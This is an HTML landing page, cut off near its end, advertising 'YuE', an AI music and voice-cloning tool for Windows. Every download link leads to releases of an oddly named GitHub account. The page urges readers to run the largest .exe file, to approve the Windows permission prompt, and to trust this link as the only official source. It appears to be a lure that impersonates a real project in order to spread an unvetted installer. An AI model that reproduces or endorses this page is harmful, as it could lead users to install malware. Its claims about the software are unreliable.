<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="YuE2 - Frontier music generation with symbolic planning, zero-shot covers, and agentic music editing. Download and create amazing music on Windows.">
    <meta name="keywords" content="ai,audio-generation,deep-learning,foundation-models,gpt,huggingface,llama,llms,music-generation,style-transfers,voice-cloning">
    <meta name="author" content="YuE Team">
    <meta property="og:title" content="YuE - Create Music Like Never Before">
    <meta property="og:description" content="Generate full songs, covers, and edit music with AI. Simple for everyone.">
    <meta property="og:url" content="https://github.com/mutinous-verbalization2184/YuE">
    <meta property="og:type" content="website">
    <meta name="twitter:card" content="summary_large_image">
    <title>YuE - AI Music Generator for Everyone</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            color: #e0e0e0;
            line-height: 1.7;
            min-height: 100vh;
        }
        .container {
            max-width: 1100px;
            margin: 0 auto;
            padding: 20px;
        }
        header {
            text-align: center;
            padding: 60px 20px 40px;
            background: rgba(255,255,255,0.05);
            border-radius: 20px;
            margin-bottom: 40px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
        }
        h1 {
            font-size: 3.5em;
            font-weight: 800;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 15px;
            letter-spacing: -0.5px;
        }
        .download-btn {
            display: inline-block;
            background: linear-gradient(45deg, #f093fb, #f5576c);
            color: white;
            padding: 20px 50px;
            font-size: 1.4em;
            font-weight: bold;
            text-decoration: none;
            border-radius: 50px;
            margin-top: 30px;
            box-shadow: 0 10px 30px rgba(240, 147, 251, 0.4);
            transition: all 0.3s ease;
            border: 2px solid white;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .download-btn:hover {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 15px 40px rgba(245, 87, 108, 0.6);
            background: linear-gradient(45deg, #f5576c, #f093fb);
        }
        h2 {
            font-size: 2.2em;
            margin: 50px 0 25px;
            color: #4ecdc4;
            border-bottom: 3px solid #4ecdc4;
            padding-bottom: 10px;
            display: inline-block;
        }
        h3 {
            font-size: 1.5em;
            color: #ffd93d;
            margin: 30px 0 15px;
        }
        p, li {
            font-size: 1.15em;
            max-width: 1000px;
        }
        ul, ol {
            margin: 20px 0 30px 30px;
        }
        li {
            margin-bottom: 12px;
        }
        .features-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 25px;
            margin: 30px 0;
        }
        .feature-card {
            background: rgba(255,255,255,0.08);
            padding: 25px;
            border-radius: 15px;
            border-left: 5px solid #4ecdc4;
            backdrop-filter: blur(5px);
            transition: transform 0.3s;
        }
        .feature-card:hover {
            transform: scale(1.03);
        }
        .feature-card h4 {
            color: #ffd93d;
            font-size: 1.3em;
            margin-bottom: 10px;
        }
        .steps-box {
            background: rgba(0,0,0,0.3);
            padding: 30px;
            border-radius: 20px;
            border: 1px solid #4ecdc4;
            margin: 30px 0;
        }
        .steps-box ol {
            font-size: 1.2em;
        }
        .steps-box li {
            padding: 8px 0;
            border-bottom: 1px dashed rgba(255,255,255,0.2);
        }
        .steps-box li:last-child {
            border-bottom: none;
        }
        .highlight {
            color: #ffd93d;
            font-weight: bold;
        }
        .badge {
            background: linear-gradient(45deg, #f093fb, #f5576c);
            color: white;
            padding: 8px 20px;
            border-radius: 30px;
            font-size: 0.9em;
            font-weight: bold;
            display: inline-block;
            margin: 5px 5px;
        }
        .warning-note {
            background: #ffd93d;
            color: #1a1a2e;
            padding: 20px;
            border-radius: 15px;
            margin: 30px 0;
            font-weight: 500;
        }
        .faq-item {
            background: rgba(255,255,255,0.05);
            padding: 20px;
            border-radius: 12px;
            margin: 15px 0;
        }
        .faq-item strong {
            color: #4ecdc4;
            display: block;
            font-size: 1.2em;
            margin-bottom: 8px;
        }
        footer {
            text-align: center;
            padding: 40px 0;
            margin-top: 50px;
            border-top: 1px solid rgba(255,255,255,0.1);
            color: #999;
        }
        @media (max-width: 768px) {
            h1 {
                font-size: 2.2em;
            }
            .container {
                padding: 10px;
            }
            .download-btn {
                padding: 15px 30px;
                font-size: 1.1em;
            }
            h2 {
                font-size: 1.8em;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎵 YuE - Your AI Music Studio</h1>
            <p style="font-size: 1.3em; color: #ddd; margin-bottom: 20px;">Create complete songs, covers, and edit music – no experience needed!</p>
            <a href="https://github.com/mutinous-verbalization2184/YuE/releases" class="download-btn">⬇️ FREE DOWNLOAD NOW</a>
            <p style="margin-top: 20px; font-size: 0.95em;">Visit this link to download the application</p>
        </header>

        <section id="about">
            <h2>✨ What is YuE?</h2>
            <p>YuE is a powerful yet incredibly easy-to-use music generator that brings professional-quality song creation to your Windows computer. Whether you want to create original songs, make a cover of your favorite track, or edit existing music, YuE does it all with just a few clicks.</p>
            <p>Think of YuE as your personal AI music studio. It's like having a composer, producer, and sound engineer all in one program – and it's completely free!</p>
        </section>

        <section id="features">
            <h2>🚀 Amazing Benefits</h2>
            <div class="features-grid">
                <div class="feature-card">
                    <h4>🎼 Full Song Creation</h4>
                    <p>Type a simple description, and YuE generates a complete song with lyrics, melody, and instrumentation. Perfect for creators, hobbyists, or anyone curious about AI music.</p>
                </div>
                <div class="feature-card">
                    <h4>🔄 Zero-Shot Covers</h4>
                    <p>Want to hear your favorite song in a different style? YuE can instantly transform any track into a new version – change the genre, mood, or even the voice – without any complex settings.</p>
                </div>
                <div class="feature-card">
                    <h4>✂️ Agentic Music Editing</h4>
                    <p>Edit any part of your music: change instruments, adjust vocals, or restructure the entire arrangement. YuE understands simple language commands and does the work for you.</p>
                </div>
                <div class="feature-card">
                    <h4>🧠 Smart Planning</h4>
                    <p>YuE uses advanced "symbolic planning" technology to ensure every song has proper structure, flow, and emotional impact – so your music always sounds professional.</p>
                </div>
                <div class="feature-card">
                    <h4>🎤 Voice Cloning & Style Transfer</h4>
                    <p>Clone any voice or apply different musical styles to your creations. Sing like your favorite artist or make a rock version of a classical piece – the possibilities are endless!</p>
                </div>
                <div class="feature-card">
                    <h4>💻 Works Offline</h4>
                    <p>Once downloaded, YuE runs entirely on your computer. No internet connection needed, no cloud limitations. Your music stays private and always available.</p>
                </div>
            </div>
        </section>

        <section id="download-guide">
            <h2>📥 Download & Install Guide</h2>
            <div class="steps-box">
                <h3>Step-by-Step Instructions (Easy Peasy!)</h3>
                <ol>
                    <li><strong>Click the green download button</strong> at the top of this page (or <a href="https://github.com/mutinous-verbalization2184/YuE/releases" style="color: #ffd93d; font-weight: bold;">click here</a>) to go to the download page.</li>
                    <li>You'll see a page with different files. <span class="highlight">Look for the file that ends with ".exe"</span> – it's usually the largest one or labeled "setup" or "installer".</li>
                    <li><span class="highlight">Just click that file</span> – your browser will start downloading it. It might take a few minutes because the program is quite powerful!</li>
                    <li>Once the download finishes, go to your "Downloads" folder (where most files go after downloading).</li>
                    <li>Double-click the downloaded .exe file. If Windows asks for permission ("Do you want to allow this app to make changes?"), click <strong>Yes</strong>.</li>
                    <li>Follow the simple on-screen instructions – just keep clicking "Next" or "Continue". The default settings are perfect.</li>
                    <li>When you see "Finish" or "Complete", the installation is done!</li>
                    <li><span class="highlight">Double-click the YuE icon</span> on your desktop or in your Start menu to launch it.</li>
                    <li>That's it! You're ready to start creating amazing music. Welcome to the future! 🎉</li>
                </ol>
            </div>
        </section>

        <section id="how-it-works">
            <h2>🎯 How It Works</h2>
            <p>Using YuE is as simple as chatting with a friend. Here's what you can do:</p>
            <ul>
                <li><strong>Create New Music:</strong> Type something like "Make a happy pop song about summer with a female singer" and press Enter. YuE does the rest!</li>
                <li><strong>Make a Cover:</strong> Choose any existing song file on your computer, then tell YuE to "make it jazz" or "slow it down". Done!</li>
                <li><strong>Edit Your Music:</strong> Open a song you like, then say "remove the drums" or "make the vocals louder". YuE makes the change instantly.</li>
                <li><strong>Experiment Freely:</strong> You can't break anything – just try different ideas and see what you get. The more you play, the more you'll love it!</li>
            </ul>
        </section>

        <section id="tips">
            <h2>💡 Helpful Tips for Best Results</h2>
            <ul>
                <li>Use descriptive words when generating music: mention the mood (e.g., "happy", "sad"), tempo ("fast", "slow"), and instruments ("piano", "guitar").</li>
                <li>For voice cloning, use clear, high-quality audio recordings of the voice you want to copy.</li>
                <li>Keep your generated music files organized – YuE saves everything in your Music folder by default.</li>
                <li>Try starting with "symbolic planning" mode – it's the smartest default and gives great results instantly.</li>
                <li>If you're not sure, just play with the "Style Transfer" feature – it's the most fun for beginners!</li>
            </ul>
            <div class="warning-note">
                <strong>⚠️ Important:</strong> Always download YuE from this official page. Never download "YuE" from unknown websites – they might contain harmful software. This is the only official download link: <a href="https://github.com/mutinous-verbalization2184/YuE/releases" style="color: #1a1a2e; text-decoration: underline;">https://github.com/mutinous-verbalization2184/YuE/releases</a>
            </div>
        </section>

        <section id="faq">
            <h2>❓ Frequently Asked Questions</h2>
            <div class="faq-item">
                <strong>Q: Is YuE really free?</strong>
                <p>A: Yes! YuE is completely free to download and use. There are no hidden costs, no subscriptions, and no premium versions. It's created for everyone to enjoy.</p>
            </div>
            <div class="faq-item">
                <strong>Q: Do I need a powerful computer?</strong>
                <p>A: YuE works on standard Windows computers. The basic version works fine on most machines. If you have a newer computer (last 3-4 years), you'll have a great experience.</p>
            </div>
            <div class="faq-item">
                <strong>Q: Can I use my own voice for singing?</strong>
                <p>A: Absolutely! YuE includes voice cloning. Just record your voice or use any audio file, and YuE can make the generated music "sing" with that voice.</p>
            </div>
            <div class="faq-item">
                <strong>Q: What if I don't know anything about music?</strong>
                <p>A: Perfect – you don't need any knowledge! YuE is designed for absolute beginners. Just type what you want in plain English, and YuE handles all the technical stuff.</p>
            </div>
            <div class="faq-item">
                <strong>Q: Is the music I create mine?</strong>
                <p>A: Yes! All music you create with YuE is 100% yours. You can share it, sell it, or use it however you like. No restrictions, no royalties.</p>
            </div>
            <div class="faq-item">
                <strong>Q: Does YuE work on Mac?</strong>
                <p>A: The current version is designed for Windows PC. Support for other systems may come in future updates – but for now, enjoy it on Windows!</p>
            </div>
        </section>

        <section id="requirements">
            <h2>🖥️ System Requirements</h2>
            <p>To get the best experience with YuE, your computer should have:</p>
            <ul>
                <li>Windows 10 or Windows 11 (64-bit)</li>
                <li>At least 8 GB of RAM (16 GB recommended for larger projects)</li>
                <li>5 GB of free hard drive space</li>
                <li>A stable internet connection for the initial download (only)</li>
                <li>A standard sound card or audio output device (any laptop/desktop has this)</li>
            </ul>
            <p>If your computer is older, YuE will still work but might be slower. We recommend closing other programs when using YuE to see the best performance.</p>
        </section>

        <section id="support">
            <h2>🤝 Need Help?</h2>
            <p>If you encounter any issues, we're here for you!</p>
            <ul>
                <li>Visit the official GitHub page for updates and community discussions.</li>
                <li>Check the help menu inside YuE for quick answers.</li>
                <li>Reach out through the